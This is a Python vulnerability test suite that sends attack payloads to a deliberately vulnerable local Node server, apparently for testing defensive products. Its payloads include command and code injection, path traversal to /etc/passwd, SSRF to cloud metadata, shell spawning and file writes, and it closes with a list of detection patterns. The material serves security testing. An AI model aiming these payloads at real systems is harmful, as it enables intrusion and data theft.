#!/usr/bin/env python3
"""
Comprehensive Vulnerability Testing Suite
Tests all vulnerabilities in the React server

WARNING: Use only in authorized testing environments!
"""

import requests
import json
import sys
import time
from typing import Dict, List, Any

TARGET_URL = "http://localhost:3000"
TIMEOUT = 10

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class VulnerabilityTestSuite:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = {
            'passed': 0,
            'failed': 0,
            'total': 0
        }

    def print_header(self, title: str):
        """Print formatted section header"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}{title}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")

    def print_test(self, name: str, success: bool, details: str = ""):
        """Print test result"""
        self.results['total'] += 1
        if success:
            self.results['passed'] += 1
            status = f"{Colors.GREEN}✓{Colors.RESET}"
        else:
            self.results['failed'] += 1
            status = f"{Colors.RED}✗{Colors.RESET}"

        print(f"{status} {name}")
        if details:
            print(f"  {Colors.YELLOW}{details}{Colors.RESET}")

    def test_1_command_injection(self):
        """Test Command Injection (exec)"""
        self.print_header("TEST 1: Command Injection (/api/exec)")

        tests = [
            ("Basic command", "whoami"),
            ("Command chaining", "whoami; id"),
            ("Command substitution", "echo $(whoami)"),
            ("Read sensitive file", "cat /etc/passwd"),
        ]

        for name, cmd in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/exec",
                    json={"command": cmd},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Command: {cmd}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_2_ping_injection(self):
        """Test Ping Command Injection"""
        self.print_header("TEST 2: Ping Injection (/api/ping)")

        tests = [
            ("Normal ping", "127.0.0.1"),
            ("Semicolon injection", "127.0.0.1; whoami"),
            ("AND operator", "127.0.0.1 && id"),
        ]

        for name, host in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/ping",
                    json={"host": host},
                    timeout=15
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Host: {host}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_3_code_injection(self):
        """Test Code Injection (eval)"""
        self.print_header("TEST 3: Code Injection (/api/calc)")

        tests = [
            ("Math expression", "2 + 2"),
            ("Process environment", "process.env"),
            ("File system access", "require('fs').readdirSync('/')"),
            ("Command execution", "require('child_process').execSync('whoami').toString()"),
        ]

        for name, expr in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/calc",
                    json={"expression": expr},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Expression: {expr[:50]}...")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_4_path_traversal(self):
        """Test Path Traversal"""
        self.print_header("TEST 4: Path Traversal (/api/file)")

        tests = [
            ("Normal file", "sample.txt"),
            ("Parent directory", "../package.json"),
            ("System file", "../../../etc/passwd"),
            ("Server file", "../server.js"),
        ]

        for name, filename in tests:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/file",
                    params={"filename": filename},
                    timeout=TIMEOUT
                )
                success = response.status_code == 200 and 'content' in response.json()
                self.print_test(name, success, f"File: {filename}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_5_ssrf(self):
        """Test Server-Side Request Forgery"""
        self.print_header("TEST 5: SSRF (/api/fetch)")

        tests = [
            ("Internal service", "http://localhost:3000/api/health"),
            ("AWS metadata", "http://169.254.169.254/latest/meta-data/"),
            ("File protocol", "file:///etc/passwd"),
        ]

        for name, url in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/fetch",
                    json={"url": url},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"URL: {url}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_6_shell_spawn(self):
        """Test Shell Injection via spawn"""
        self.print_header("TEST 6: Shell Spawn Injection (/api/shell)")

        tests = [
            ("Echo command", "echo", "test"),
            ("Shell command", "sh", "-c whoami"),
            ("Bash command", "bash", "-c 'cat /etc/passwd'"),
        ]

        for name, cmd, args in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/shell",
                    json={"cmd": cmd, "args": [args]},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Command: {cmd} {args}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_7_file_write(self):
        """Test Arbitrary File Write"""
        self.print_header("TEST 7: Arbitrary File Write (/api/writefile)")

        tests = [
            ("Normal write", "test.txt", "Test content"),
            ("Path traversal", "../public/pwned.txt", "Pwned!"),
        ]

        for name, filename, content in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/writefile",
                    json={"filename": filename, "content": content},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"File: {filename}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_8_deserialization(self):
        """Test Unsafe Deserialization"""
        self.print_header("TEST 8: Unsafe Deserialization (/api/deserialize)")

        tests = [
            ("Simple object", '{"name": "test", "value": 123}'),
            ("Code execution", '{"cmd": "require(\'child_process\').execSync(\'whoami\').toString()"}'),
        ]

        for name, data in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/deserialize",
                    json={"data": data},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Data: {data[:40]}...")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def test_9_module_loading(self):
        """Test Arbitrary Module Loading"""
        self.print_header("TEST 9: Arbitrary Module Loading (/api/require)")

        tests = [
            ("Child process module", "child_process"),
            ("File system module", "fs"),
            ("Network module", "net"),
        ]

        for name, module in tests:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/require",
                    json={"module": module},
                    timeout=TIMEOUT
                )
                success = response.json().get('success', False)
                self.print_test(name, success, f"Module: {module}")
            except Exception as e:
                self.print_test(name, False, f"Error: {e}")

    def print_summary(self):
        """Print test summary"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}TEST SUMMARY{Colors.RESET}")
        print(f"{'='*60}")
        print(f"Total Tests:  {self.results['total']}")
        print(f"{Colors.GREEN}Passed:       {self.results['passed']}{Colors.RESET}")
        print(f"{Colors.RED}Failed:       {self.results['failed']}{Colors.RESET}")

        success_rate = (self.results['passed'] / self.results['total'] * 100) if self.results['total'] > 0 else 0
        print(f"Success Rate: {success_rate:.1f}%")
        print(f"{'='*60}\n")

        # Detection recommendations
        print(f"{Colors.YELLOW}{Colors.BOLD}🛡️  DEFENSIVE PRODUCT SHOULD DETECT:{Colors.RESET}")
        detections = [
            "Command injection patterns (;, &&, ||, |)",
            "Path traversal sequences (../, ..\)",
            "Sensitive file access (/etc/passwd, /etc/shadow)",
            "eval() and Function() constructor usage",
            "Child process spawning",
            "Network requests to internal IPs",
            "Cloud metadata service access",
            "Prototype pollution (__proto__)",
            "Arbitrary module loading",
            "Suspicious system commands"
        ]
        for detection in detections:
            print(f"  {Colors.YELLOW}•{Colors.RESET} {detection}")

        print(f"\n{'='*60}\n")

    def run_all_tests(self):
        """Run all vulnerability tests"""
        print(f"{Colors.BOLD}{Colors.MAGENTA}")
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║     VULNERABLE SERVER COMPREHENSIVE TEST SUITE            ║")
        print("║     For Testing Defensive Security Products              ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print(f"{Colors.RESET}\n")

        # Check server health
        try:
            response = self.session.get(f"{self.base_url}/api/health", timeout=5)
            if response.status_code == 200:
                print(f"{Colors.GREEN}✓ Server is running at {self.base_url}{Colors.RESET}\n")
            else:
                raise Exception("Server not responding correctly")
        except Exception as e:
            print(f"{Colors.RED}✗ Cannot connect to server: {e}{Colors.RESET}")
            print(f"Please start the server with: npm start")
            sys.exit(1)

        # Run all tests
        self.test_1_command_injection()
        self.test_2_ping_injection()
        self.test_3_code_injection()
        self.test_4_path_traversal()
        self.test_5_ssrf()
        self.test_6_shell_spawn()
        self.test_7_file_write()
        self.test_8_deserialization()
        self.test_9_module_loading()

        # Print summary
        self.print_summary()


def main():
    """Main entry point"""
    tester = VulnerabilityTestSuite(TARGET_URL)
    tester.run_all_tests()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠️  Testing interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{Colors.RED}✗ Unexpected error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
